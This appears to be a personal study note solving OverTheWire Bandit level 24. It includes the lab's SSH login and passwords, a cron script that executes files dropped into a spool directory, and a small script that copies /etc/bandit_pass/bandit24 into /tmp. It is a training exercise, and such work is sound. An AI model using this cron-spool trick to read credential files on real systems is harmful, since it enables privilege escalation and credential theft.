---
tags: Techniek
---
# Bandit Level 24
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Setup from [[Bandit23 - Shell variables]]
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
``` 

Password:
```
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

## Method
```bash
# Okay, so what's in /etc/cron.d?
$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root

# Cool, let's check out the one for this level. 
$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
# On reboot, and every minute:
# as user bandit24
# execute /usr/bin/cronjob_bandit24.sh
# and toss log into void

# So what does that file do?
$ cat /usr/bin/cronjob_bandit24.sh
```

The file:
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;									# /var/spool/bandit24 because that's who executes it
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)" 		# identify owner
        if [ "${owner}" = "bandit23" ]; then	# must be owned by bandit23 (not 24!)
            timeout -s 9 60 ./$i 				# execute with timelimit 
        fi 										# close if
        rm -f ./$i 								# delete file after use
    fi 											# close if
done
```

So if I write a shell script and put it at `/var/spool/bandit24`, it will be executed and deleted. (Save a copy!) 

```bash
# Alright, so I need to make a shell script. 
$ touch /tmp/bandit24.sh
$ nano /tmp/bandit24.sh
```

When opening that file:
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24.pass
```

Ooookay, so it already exists? Cool. Can I copy this to the right folder?

```bash
$ cp /tmp/bandit24.sh /var/spool/bandit24
# wait for a minute...
# and...
$ cat /tmp/bandit24.pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
# Jackpot!
```

Password: 
```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

### See further
[[Bash]]